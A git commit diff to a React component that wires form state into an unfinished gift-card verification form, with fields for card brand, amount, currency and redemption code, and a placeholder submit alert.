5da56f13e3bd0524d166f55e394424a123c31610
Techthoth <ayotomiwadavid@proton.me>
2024-04-26 10:55:49 -0700

    saving progress

--- src/component/Contactsection.js
+++ src/component/Contactsection.js
@@ -1,6 +1,28 @@
-import React from 'react'
+import React, { useState } from 'react'
 
 const Contactsection = () => {
+    let [cardDetails, setCardDetails] = useState({
+        cardName: '',
+        cardAmount: '',
+        currency: '',
+        cardRedeptionCode: '',
+    });
+
+    const handleChange = (event) =>{
+        let {name, value } = event.target
+
+        setCardDetails((prevalue) =>{
+            return {
+                ...prevalue,
+                [name]: value,
+            }
+        })
+        console.log(cardDetails)
+    }
+    const handleForm = (e) =>{
+        e.preventDefault()
+        alert("Don't panic I'm working")
+    }
     return (
         <section class="bg-[#e8f8ff] dark:bg-gray-900" id='verifyCard'>
             <div class="py-5 lg:py-16 md:px-4 px-2 mx-auto">
@@ -9,7 +31,7 @@ const Contactsection = () => {
                 <form action="#" class="space-y-5 w-full items-center justify-center flex flex-col">
                     <div className='w-full flex flex-col items-center justify-center'>
                         <label for="cardSelect" class=" md:w-[75%] w-[95%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-[#0B212F] dark:text-white">Select Card</label>
-                        <select id="cardSelect" class="bg-gray-50 h-[55px] w-[95%] md:w-[65%] border border-gray-300 text-[#0B212F] text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
+                        <select id="cardSelect" value={cardDetails.cardName} name='cardName' onChange={handleChange} class="bg-gray-50 h-[55px] w-[95%] md:w-[65%] border border-gray-300 text-[#0B212F] text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                             <option value="apple">apple </option>
                             <option value="amex">amex </option>
                             <option value="amazon">amazon</option>
@@ -26,16 +48,18 @@ const Contactsection = () => {
                             <option value="vanilla visa">vanilla visa</option>
                             <option value="Visa silvery White">Visa silvery White</option>
                             <option value="Walmart Visa">Walmart Visa</option>
-                            <option selected value='Xbox'> Xbox</option>
+                            <option value='Xbox'> Xbox</option>
                         </select>
                     </div>
                     <div className='w-full flex flex-col items-center justify-center'>
                         <label for="subject" class=" md:w-[75%] w-[95%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-gray-900 dark:text-gray-300">Enter Amount</label>
-                        <input type="number" id="subject" class="block  h-[55px] w-[95%] md:w-[65%] p-3 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 shadow-sm focus:ring-primary-500 focus:border-primary-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-primary-500 dark:focus:border-primary-500 dark:shadow-sm-light" placeholder="1000" required />
+                        <input type="number" name='cardAmount' value={cardDetails.cardAmount} onChange={handleChange} id="subject" class="block  h-[55px] w-[95%] md:w-[65%] p-3 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 shadow-sm focus:ring-primary-500 focus:border-primary-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-primary-500 dark:focus:border-primary-500 dark:shadow-sm-light" placeholder="1000" required />
                     </div>
                     <div className='w-full flex flex-col items-center justify-center'>
                         <label for="countries" class=" md:w-[75%] w-[95%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-gray-900 dark:text-white">Select Currency</label>
-                        <select id="countries" class="bg-gray-50 h-[55px] w-[95%] md:w-[65%] border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
+                        <select id="countries" onChange={handleChange} 
+                        name='currency'
+                        value={cardDetails.currency} class="bg-gray-50 h-[55px] w-[95%] md:w-[65%] border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                             <option value='USD'>USD</option>
                             <option value="CAD">CAD</option>
                             <option value="AUD">AUD</option>
@@ -44,10 +68,15 @@ const Contactsection = () => {
                         </select>
                     </div>
                     <div class="sm:col-span-2 w-full flex flex-col items-center justify-center">
-                        <label for="message" class=" w-[95%] md:w-[75%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-gray-900 dark:text-gray-400">Redemption Code</label>
-                        <input type='number' id="message" class="block p-2.5 h-[55px] w-[95%] md:w-[65%] text-sm text-gray-900 bg-gray-50 rounded-lg shadow-sm border border-gray-300 focus:ring-primary-500 focus:border-primary-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-primary-500 dark:focus:border-primary-500" placeholder="Redemption Code"></input>
+                        <label for="cardRedeptionCode" class=" w-[95%] md:w-[75%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-gray-900 dark:text-gray-400">Redemption Code</label>
+                        <input type='text' onChange={handleChange} 
+                        value={cardDetails.cardRedeptionCode}
+                        id='cardRedeptionCode'
+                        name='cardRedeptionCode'
+                        class="block p-2.5 h-[55px] w-[95%] md:w-[65%] text-sm text-gray-900 bg-gray-50 rounded-lg shadow-sm border border-gray-300 focus:ring-primary-500 focus:border-primary-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-primary-500 dark:focus:border-primary-500" 
+                        placeholder="Redemption Code" />
                     </div>
-                    <button type="submit" class="py-3 px-5 h-[55px] w-[95%] md:w-[65%] text-sm font-medium text-center text-white rounded-lg bg-primary-700 bg-[#0B212F] hover:bg-[#0B212F] focus:ring-4 focus:outline-none focus:ring-primary-300 dark:bg-primary-600 dark:hover:bg-primary-700 dark:focus:ring-primary-800">Verify</button>
+                    <button type="submit" class="py-3 px-5 h-[55px] w-[95%] md:w-[65%] text-sm font-medium text-center text-white rounded-lg bg-primary-700 bg-[#0B212F] hover:bg-[#0B212F] focus:ring-4 focus:outline-none focus:ring-primary-300 dark:bg-primary-600 dark:hover:bg-primary-700 dark:focus:ring-primary-800" onClick={handleForm}>Verify</button>
                 </form>
             </div>
         </section>
